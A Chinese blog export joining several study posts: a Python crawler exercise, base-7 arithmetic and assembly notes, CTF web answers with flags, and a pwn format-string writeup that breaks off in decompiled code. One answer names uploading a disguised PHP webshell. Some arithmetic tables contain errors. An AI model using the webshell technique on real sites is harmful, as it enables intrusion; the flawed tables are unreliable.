    <content><![CDATA[<h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><h2 id="关于内容的思考"><a href="#关于内容的思考" class="headerlink" title="关于内容的思考"></a>关于内容的思考</h2><p>书里有两处遗漏</p><ol><li><p>正则匹配不当</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure><p>这里应该是/place/default/这样的格式，因为re.match只匹配开头串，前面重复的部分也要写上</p></li><li><p>在requests这里讲解的时候代码少了个return html</p></li></ol><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def download(url, user_agent='wswp', robots=None, num_retries=5, proxies=None):</span></span><br><span class="line"><span class="string">    print("Downloading:", url)</span></span><br><span class="line"><span class="string">    headers = &#123;'User-Agent': user_agent&#125;</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        resp = requests.get(url, headers=headers, proxies=proxies)</span></span><br><span class="line"><span class="string">        html = resp.text</span></span><br><span class="line"><span class="string">        # print(html)</span></span><br><span class="line"><span class="string">        if resp.status_code &gt;= 400:</span></span><br><span class="line"><span class="string">            print("Downloading error:", resp.text)</span></span><br><span class="line"><span class="string">            html = None</span></span><br><span class="line"><span class="string">            if num_retries and 500 &lt;= resp.status_code &lt; 600:</span></span><br><span class="line"><span class="string">                return download(url, num_retries - 1)</span></span><br><span class="line"><span class="string">    except requests.exceptions.RequestException as e:</span></span><br><span class="line"><span class="string">        print("Download error", e.reason)</span></span><br><span class="line"><span class="string">        html = None</span></span><br><span class="line"><span class="string">    return html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(url, user_agent=<span class="string">'wswp'</span>, robots=None, num_retries=<span class="number">5</span>,proxies = None)</span>:</span></span><br><span class="line">    print(<span class="string">"Downloading:"</span>, url)</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, headers=headers, proxies = proxies)</span><br><span class="line">        html = resp.text</span><br><span class="line">        <span class="keyword">if</span> resp.status_code &gt; <span class="number">400</span>:</span><br><span class="line">            print(<span class="string">"Download error"</span>, resp.text)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> num_retries <span class="keyword">and</span> <span class="number">500</span> &lt;= resp.status_code &lt; <span class="number">600</span>:</span><br><span class="line">                <span class="keyword">return</span> download(url,num_retries<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Download error"</span>, e.reason)</span><br><span class="line">        html = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_sitemap</span><span class="params">(url)</span>:</span></span><br><span class="line">    sitemap = download(url)</span><br><span class="line">    print(sitemap)</span><br><span class="line">    links = re.findall(<span class="string">r'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>, sitemap)</span><br><span class="line">    print(links)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        html = download(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_errors = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_site</span><span class="params">(url, max_error=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">        pg_url = <span class="string">"&#123;&#125;&#123;&#125;"</span>.format(url, page)</span><br><span class="line">        html = download(pg_url)</span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            num_errors += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num_errors == max_error:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links</span><span class="params">(html)</span>:</span></span><br><span class="line">    webpage_regex = re.compile(<span class="string">r'a href="(.*?)"&gt;'</span>)</span><br><span class="line">    <span class="keyword">return</span> webpage_regex.findall(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> robotparser</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_robots_parser</span><span class="params">(robots_url)</span>:</span></span><br><span class="line">    rp = robotparser.RobotFileParser()</span><br><span class="line">    rp.set_url(<span class="string">'http://example.python-scraping.com/robots.txt'</span>)</span><br><span class="line">    rp.read()</span><br><span class="line">    <span class="keyword">return</span> rp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_craw</span><span class="params">(start_url, link_regex, robots_url = None, user_agent = <span class="string">'wswp'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> robots_url:</span><br><span class="line">        robots_url = <span class="string">'&#123;&#125;/robots.txt'</span>.format(start_url)</span><br><span class="line">    rp = get_robots_parser(robots_url)</span><br><span class="line">    craw_queue = [start_url]</span><br><span class="line">    seen = set(craw_queue)</span><br><span class="line">    <span class="keyword">while</span> craw_queue:</span><br><span class="line">        url = craw_queue.pop()</span><br><span class="line">        <span class="keyword">if</span> rp.can_fetch(user_agent,url):</span><br><span class="line">            html = download(url,user_agent=user_agent)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Blocked by robots.txt"</span>, url)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> get_links(html):</span><br><span class="line">            <span class="keyword">if</span> re.match(link_regex, link):</span><br><span class="line">                abs_link = urljoin(start_url, link)</span><br><span class="line">                <span class="keyword">if</span> abs_link <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">                    seen.add(abs_link)</span><br><span class="line">                    craw_queue.append(abs_link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># craw_sitemap("http://example.python-scraping.com/sitemap.xml")</span></span><br><span class="line">    <span class="comment">#craw_site("http://example.python-scraping.com/view/-")</span></span><br><span class="line">    link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>链接爬取时需要关注重复链接</li><li>关注robots.txt</li><li>利用数据库id爬取网站</li><li>自己分析网页并善用正则匹配</li><li>requests库相对简单</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3e78770/">https://noone-hub.github.io/posts/3e78770/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>re学习第一天</title>
    <url>/posts/209dab3e/</url>
    <content><![CDATA[<h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><ol><li>进制的实质就是查表</li><li>熟悉2进制跟16进制的转换</li><li>熟悉进制表的制作以及计算进制之间的加减乘除</li></ol><h1 id="进制练习1"><a href="#进制练习1" class="headerlink" title="进制练习1"></a>进制练习1</h1><p>通过编写7进制加法表，乘法表，并计算<br>23456+54356 = ？<br>5621 - 654 = ？<br>234 * 65 = ？</p><h2 id="首先编写1-100的7进制数据"><a href="#首先编写1-100的7进制数据" class="headerlink" title="首先编写1-100的7进制数据"></a>首先编写1-100的7进制数据</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th><th>七</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td></tr><tr><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td></tr><tr><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td></tr><tr><td>30</td><td>31</td><td>32</td><td>33</td><td>34</td><td>35</td><td>36</td></tr><tr><td>40</td><td>41</td><td>42</td><td>43</td><td>44</td><td>45</td><td>46</td></tr><tr><td>50</td><td>51</td><td>52</td><td>53</td><td>54</td><td>55</td><td>56</td></tr><tr><td>60</td><td>61</td><td>62</td><td>63</td><td>64</td><td>65</td><td>66</td></tr></tbody></table><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="编写7进制加法表"><a href="#编写7进制加法表" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>1+1=2</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1+2=3</td><td>2+2=4</td><td></td><td></td><td></td><td></td></tr><tr><td>1+3=4</td><td>2+3=5</td><td>3+3=6</td><td></td><td></td><td></td></tr><tr><td>1+4=5</td><td>2+4=6</td><td>3+4=10</td><td>4+4=11</td><td></td><td></td></tr><tr><td>1+5=6</td><td>2+5=10</td><td>3+5=11</td><td>4+5=12</td><td>5+5=13</td><td></td></tr><tr><td>1+6=7</td><td>2+6=11</td><td>3+6=12</td><td>4+6=13</td><td>5+6=14</td><td>6+6=15</td></tr></tbody></table><h2 id="编写7进制乘法表"><a href="#编写7进制乘法表" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>1*1=1</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1*2=2</td><td>2*2=4</td><td></td><td></td><td></td><td></td></tr><tr><td>1*3=3</td><td>2*3=6</td><td>3*3=12</td><td></td><td></td><td></td></tr><tr><td>1*4=4</td><td>2*4=11</td><td>3*4=14</td><td>4*4=22</td><td></td><td></td></tr><tr><td>1*5=5</td><td>2*5=13</td><td>3*5=21</td><td>4*5=26</td><td>5*5=34</td><td></td></tr><tr><td>1*6=6</td><td>2*6=15</td><td>3*6=24</td><td>4*6=33</td><td>5*6=42</td><td>6*6=51</td></tr></tbody></table><h2 id="计算结果"><a href="#计算结果" class="headerlink" title="计算结果"></a>计算结果</h2><p>$23456 + 54356 = ?$<br>计算过程：</p><ol><li>6+6 查表是15，进一位，留5</li><li>5+5 查表是13， 13 + 1,3+1查表为4，为14，进一位，留4</li><li>4+3 查表是10， 10 + 1,11，进一位，留1</li><li>3+4 查表是10， 10+1 = 11，进一位，留1</li><li>2+5 查表是10， 10+1 = 11，进一位，留1<br>结果为：111145</li></ol><p>$5621 - 654 = ?$<br>计算过程：</p><ol><li>1不够减，借一位，为11,11-4=？，查表可得为4，</li><li>2-1 = 1,1-5不够，借一位，11-5=3</li><li>5-6不够，15-6=6</li><li>4<br>结果为：4634</li></ol><p>$234 * 65 = ?$<br>计算过程：</p><ol><li>4*5 = 26，留6 进2</li><li>3*5 = 21， 21+2， 23，留3 进2</li><li>2*5 = 13 13+2=15 留5，进1</li><li>1536</li><li>4*6 = 33, 留3 进3</li><li>3*6 = 24， 24+3,4+3 == 10,留0，进3</li><li>2*6 = 15， 15+3， 5+3=11，进2，留1</li><li>2103<br>结果为：22536</li></ol><h1 id="2-3-1？可能嘛"><a href="#2-3-1？可能嘛" class="headerlink" title="2+3 = 1？可能嘛"></a>2+3 = 1？可能嘛</h1><p>可能，当定义如下的10进制时便可，0,2,3,1,5,6,7,8,9,4</p><h1 id="16进制与二进制的映射"><a href="#16进制与二进制的映射" class="headerlink" title="16进制与二进制的映射"></a>16进制与二进制的映射</h1><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0001</td><td>0010</td><td>0011</td><td>0100</td><td>0101</td><td>0110</td><td>0111</td><td>1000</td><td>1001</td><td>1010</td><td>1011</td><td>1100</td><td>1101</td><td>1110</td><td>1111</td></tr><tr><td>#</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="自行编写进制加密"><a href="#自行编写进制加密" class="headerlink" title="自行编写进制加密"></a>自行编写进制加密</h1><p>定义如下的7进制，7，5,6,1,2,3,0<br>试着计算上题中的计算题目</p><h2 id="先编写进制对应"><a href="#先编写进制对应" class="headerlink" title="先编写进制对应"></a>先编写进制对应</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th><th>七</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td><td>1</td><td>2</td><td>3</td><td>0</td></tr><tr><td>54</td><td>55</td><td>56</td><td>51</td><td>52</td><td>53</td><td>50</td></tr><tr><td>64</td><td>65</td><td>66</td><td>61</td><td>62</td><td>63</td><td>60</td></tr><tr><td>14</td><td>15</td><td>16</td><td>11</td><td>12</td><td>13</td><td>10</td></tr><tr><td>24</td><td>25</td><td>26</td><td>21</td><td>22</td><td>23</td><td>20</td></tr><tr><td>34</td><td>35</td><td>36</td><td>31</td><td>32</td><td>33</td><td>30</td></tr><tr><td>04</td><td>05</td><td>06</td><td>01</td><td>02</td><td>03</td><td>00</td></tr></tbody></table><h2 id="编写7进制加法表-1"><a href="#编写7进制加法表-1" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>5+5=6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>5+6=1</td><td>6+6=2</td><td></td><td></td><td></td><td></td></tr><tr><td>5+1=2</td><td>6+1=3</td><td>1+1=0</td><td></td><td></td><td></td></tr><tr><td>5+2=3</td><td>6+2=0</td><td>1+2=54</td><td>2+2=55</td><td></td><td></td></tr><tr><td>5+3=0</td><td>6+3=54</td><td>1+3=55</td><td>2+3=56</td><td>3+3=51</td><td></td></tr><tr><td>5+0=54</td><td>6+0=55</td><td>1+0=56</td><td>2+0=51</td><td>3+0=52</td><td>0+0=53</td></tr></tbody></table><h2 id="编写7进制乘法表-1"><a href="#编写7进制乘法表-1" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table><thead><tr><th>一</th><th>二</th><th>三</th><th>四</th><th>五</th><th>六</th></tr></thead><tbody><tr><td>5*5=5</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>5*6=6</td><td>6*6=2</td><td></td><td></td><td></td><td></td></tr><tr><td>5*1=1</td><td>6*1=0</td><td>1*1=56</td><td></td><td></td><td></td></tr><tr><td>5*2=2</td><td>6*2=55</td><td>1*2=53</td><td>2*2=66</td><td></td><td></td></tr><tr><td>5*3=3</td><td>6*3=51</td><td>1*3=65</td><td>2*3=60</td><td>3*3=12</td><td></td></tr><tr><td>5*0=0</td><td>6*0=53</td><td>1*0=62</td><td>2*0=11</td><td>3*0=26</td><td>0*0=35</td></tr></tbody></table><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p>$23456+54356=？$<br>计算过程：</p><ol><li>6+6 = 2 留2</li><li>5+5 = 6 留6</li><li>4+3 = 3 留3</li><li>3+4 = 3 留3</li><li>2+5 = 3 留3<br>结果：33362</li></ol><p>$5621-654=？$<br>计算过程：</p><ol><li>1-4 = 1</li><li>2-5 = 1</li><li>6-6 = 0</li><li>5<br>结果：5011</li></ol><p>$234*65=?$<br>计算过程：</p><ol><li>4*5 = 4</li><li>3*5 = 3</li><li>2*5 = 2</li><li>234</li><li>4*6 = 4</li><li>3*6 = 51 留1 进5</li><li>2*6 = 55 55 + 5 ， 5+5=6， 55+5=56，留6，进5</li><li>5614<br>结果：51434</li></ol><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="push-后，esp改动的一定是按机器字长来的吗？"><a href="#push-后，esp改动的一定是按机器字长来的吗？" class="headerlink" title="push 后，esp改动的一定是按机器字长来的吗？"></a>push 后，esp改动的一定是按机器字长来的吗？</h2><p>不一定，可以push 16位的二进制数，esp-2,不可以弄8进制的数<br>32位：</p><ul><li>push dword ptr ds:[0x1234] esp = esp - 4</li><li>push eax</li><li>push ax</li><li>push al X</li><li>push word ptr ds:[0x1234] esp = esp - 2</li></ul><ul><li>pop ax esp = esp + 2</li><li>pop eax</li></ul><p>pushad popad</p><h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><ol><li>进位标志CF（carry flag) 最高位产生进位或者借位，</li><li>奇偶标志位PF(Parity flag) 结果中1的个数，偶数PF=1,奇数PF=0</li><li>辅助进位标志AF(Auxiliary Carry flag)</li><li>零标志位ZF(zero flag) 用来反映结果是否是0</li><li>符号标志位SF（signed flag) 运算结果的符号位</li><li>溢出标志位OF(overflow flag)</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/209dab3e/">https://noone-hub.github.io/posts/209dab3e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>2019软件测试web安全题目writeup收集</title>
    <url>/posts/40674c1b/</url>
    <content><![CDATA[<h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>比比手速 靶机地址：101.71.29.5:10065</p><p>burp抓包可知密码<br>然后文件上传，1.php.jpg<br>连接小马</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnplZGR5dS5pbmZvLzIwMTkvMDIvMjQvJUU1JUFFJTg5JUU2JTgxJTkyMSVFNiU5QyU4OCVFNiU5QyU4OCVFOCVCNSU5Qi8=" title="https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/">https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/<i class="fa fa-external-link"></i></span></p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTYvYXJ0aWNsZS9kZXRhaWxzLzgzODY3OTc2" title="https://blog.csdn.net/u011377996/article/details/83867976">https://blog.csdn.net/u011377996/article/details/83867976<i class="fa fa-external-link"></i></span></p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p><span class="exturl" data-url="aHR0cHM6Ly9zc3llYXRzLmdpdGh1Yi5pby8yMDE4LzA5LzAxLyVFNSVBRSU4OSVFNiU4MSU5MjclRTYlOUMlODglRTglQjUlOUIlRTklODMlQTglRTUlODglODYlRTklQTIlOTh3cml0ZXVwLw==" title="https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/">https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/<i class="fa fa-external-link"></i></span><br>666_0rdorby_you_can</p><h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p><span class="exturl" data-url="aHR0cHM6Ly9yb3l0c2UuZ2l0aHViLmlvLzIwMTcvMDcvMDMvQ1RGX1dyaXRlVXAvI2Vhc3ktbG9naW4=" title="https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login">https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cDovL3NpdGUzLnNqay5zcGFjZS9kb3NnazEucGhw" title="http://site3.sjk.space/dosgk1.php">http://site3.sjk.space/dosgk1.php<i class="fa fa-external-link"></i></span></p><p>a327f27394c63ef5d6b1eed9591b90a4</p><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>抓包可得</p><p>c456aa77cf2bc89affb665194e9dee57</p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p><span class="exturl" data-url="aHR0cHM6Ly9za3lzZWMudG9wLzIwMTgvMDkvMjQvMjAxOCVFNSVBRSU4OSVFNiU4MSU5MiVFNiU5RCVBRi05JUU2JTlDJTg4JUU2JTlDJTg4JUU4JUI1JTlCV3JpdGV1cC8jV2ViMg==" title="https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2">https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2<i class="fa fa-external-link"></i></span><br>aa5237a5fc25af3fa07f1d724f7548d7</p><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p><span class="exturl" data-url="aHR0cDovL2ZsYWcwLmNvbS8yMDE5LzA5LzI3LzIwMTklRTUlQUUlODklRTYlODElOTIlRTYlOUQlQUZXZWIlRTUlQUUlODklRTUlODUlQTglRTYlQjUlOEIlRTglQUYlOTUlRTUlQTQlQTclRTglQjUlOUIlRTclQkIlODMlRTQlQjklQTAlRTglQjUlOUJXcml0ZXVwLw==" title="http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/<i class="fa fa-external-link"></i></span></p><h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p><span class="exturl" data-url="aHR0cDovL3hjeDEwMjQuY29tL0FydEluZm8vNTI0MDM5Lmh0bWw=" title="http://xcx1024.com/ArtInfo/524039.html">http://xcx1024.com/ArtInfo/524039.html<i class="fa fa-external-link"></i></span></p><p>981369acba32abc4e28103fedd4891d2</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/40674c1b/">https://noone-hub.github.io/posts/40674c1b/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray_linux客户端构思</title>
    <url>/posts/d59440d9/</url>
    <content><![CDATA[<h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol><li>修改监听端口</li><li>导入vmess</li><li>指定配置文件替换</li><li>界面输入配置进行更换</li><li>多账号切换</li><li>订阅更新</li><li>修改配置</li></ol><p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d59440d9/">https://noone-hub.github.io/posts/d59440d9/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux,v2ray,gui,客户端</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署踩坑</title>
    <url>/posts/4169889/</url>
    <content><![CDATA[<h1 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>daovoice缓速会导致博客打开白页</p><h2 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h2><p>安装必要组件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xclip</span><br></pre></td></tr></table></figure><p>vscode装插件picgo,markdown_preview</p><p>用github做图床，自己创建项目<br>填写picgo配置里的</p><ol><li>Picgo › Pic Bed › Github: Branch</li><li>Picgo › Pic Bed › Github: Repo</li><li>Picgo › Pic Bed › Github: Token</li></ol><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>branch通常填master<br>repo复制过来就好<br>token在github-&gt;setting-&gt;developer settings 选择generate new token</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/20191030230028.png" alt="20191030230028.png"></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/4169889/">https://noone-hub.github.io/posts/4169889/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>linux,hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒部分题解</title>
    <url>/posts/afb883f/</url>
    <content><![CDATA[<p>9 b9a5a633c806f9d24e42681c3f0360ba<br>5 4f1feb7c9b95b6d855c2a6ef8364452d<br>锅 $flag = “UNCTF{f66aa32e732bdb88556acc634371f673};<br>最好的php UNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>10 flag is ——&gt;UNCTF585 ae8df50433 972bb6ebd7 6e3ebd9f4</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/afb883f/">https://noone-hub.github.io/posts/afb883f/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全， writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>360杯pwn部分题解</title>
    <url>/posts/3dac6f4c/</url>
    <content><![CDATA[<h1 id="360杯pwn题解"><a href="#360杯pwn题解" class="headerlink" title="360杯pwn题解"></a>360杯pwn题解</h1><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/20191030225324.png" alt="20191030225324.png"></p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>格式化字符串的题目，不过不是常规的栈格式化字符串，放到了bss段里的格式化字符串，当初做的时候不知道，以为常规。。。剩半个钟的时候发觉了，然后也没做了，后面复盘把他做了，发觉也不是那么一蹴而就的，有点意思</p><p>还有个点我不清楚。当时远程泄露libc我是查不到的，所以这个我不知道该如何解决？希望各位大佬能指点一二</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to 360CTF_2019"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; N; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Input"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Exit"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, 